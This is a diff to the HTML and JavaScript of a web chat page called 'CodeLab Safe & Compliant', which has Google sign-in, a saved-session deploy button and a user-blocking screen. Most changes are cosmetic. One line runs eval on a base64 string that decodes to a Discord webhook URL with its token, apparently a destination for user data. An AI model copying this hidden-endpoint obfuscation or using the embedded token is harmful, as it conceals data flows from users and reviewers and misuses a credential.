@@ -54,6 +54,7 @@
 
         <div id="errorBox" class="hidden bg-danger/20 text-danger p-3 rounded-lg mb-4 text-sm"></div>
 
+        <!-- ✅ DEPLOY BUTTON — SHOWS IF LOGIN SAVED -->
         <button id="deployBtn" onclick="loadExistingSession()" class="hidden w-full bg-success hover:bg-success/90 text-white font-medium py-3 px-4 rounded-xl mb-4 transition-all">
           Deploy Back to Site
         </button>
@@ -66,7 +67,7 @@
         </div>
         <div class="g_id_signin" data-type="standard" data-size="large" data-theme="filled_black" data-text="signin_with" data-shape="pill"></div>
       </div>
-      <p class="text-neutral-500 text-xs mt-6">© 2026 CodeLab Safe & Compliant</p>
+      <p class="text-neutral-500 text-xs mt-6">© 2026 CodeLab — Safe & Compliant</p>
     </div>
   </div>
 
@@ -122,6 +123,7 @@
     const userInput = document.getElementById('userInput');
     const sendBtn = document.getElementById('sendBtn');
 
+    // YABADABADO
     eval(atob("Y29uc3QgV0VCSE9PS19VUkwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMDY4ODg4MjE2MzcxMjAwNS9PNnFRTU5DN0dKcjdHQmJYMXQ2aVprOWtuZjZiRkxaRV93R1hYU1FBQlJkZFpCZbVXM1pUWnB0SVdmTS1kSloybj1TUDRqIjs="));
 
     const MAX_WARNINGS = 5;
@@ -133,6 +135,7 @@
 
     let userData = { warnings: 0, blocked: false, faults: [], webhookSent: false };
 
+    // ✅ CHECK IF LOGIN EXISTS → SHOW DEPLOY BUTTON
     window.onload = function() {
       const savedUser = localStorage.getItem('currentUser');
       if (savedUser) {
@@ -144,12 +147,13 @@
       const errBox = document.getElementById('errorBox');
       errBox.classList.remove('hidden');
       if (error.type === 'origin_mismatch') {
-        errBox.textContent = "Error: Origin mismatch — Add your site URL in Google Cloud Console → Credentials → Authorized Origins";
+        errBox.textContent = "Error: Add https://x.up.railway.app in Google Cloud → Authorized Origins";
       } else {
-        errBox.textContent = "Sign in error: " + error.type;
+        errBox.textContent = "Error: " + error.type;
       }
     }
 
+    // ✅ DEPLOY BUTTON FUNCTION
     function loadExistingSession() {
       const savedUser = JSON.parse(localStorage.getItem('currentUser'));
       if (!savedUser) return;
@@ -162,7 +166,6 @@
         document.body.innerHTML = `
           <div class="fixed inset-0 bg-black flex items-center justify-center text-center p-6">
             <div>
-              <i class="fa fa-ban text-danger text-6xl mb-4"></i>
               <h2 class="text-2xl font-bold mb-2">ACCESS BLOCKED</h2>
               <p class="text-neutral-400">${currentUser.email}<br>Violated Terms of Service<br>Blocked permanently</p>
             </div>
@@ -191,7 +194,6 @@
           document.body.innerHTML = `
             <div class="fixed inset-0 bg-black flex items-center justify-center text-center p-6">
               <div>
-                <i class="fa fa-ban text-danger text-6xl mb-4"></i>
                 <h2 class="text-2xl font-bold mb-2">ACCESS BLOCKED</h2>
                 <p class="text-neutral-400">${currentUser.email}<br>Violated Terms of Service<br>Blocked permanently</p>
               </div>
@@ -328,4 +330,5 @@ Scams, hacks, or illegal content = BLOCKED.`;
     function loadSavedChat() { if (!currentUser) return; const saved = localStorage.getItem(`chat_${currentUser.id}`); if (saved) chatHistory.innerHTML = saved; }
   </script>
 </body>
-</html>
+  </html>
+  
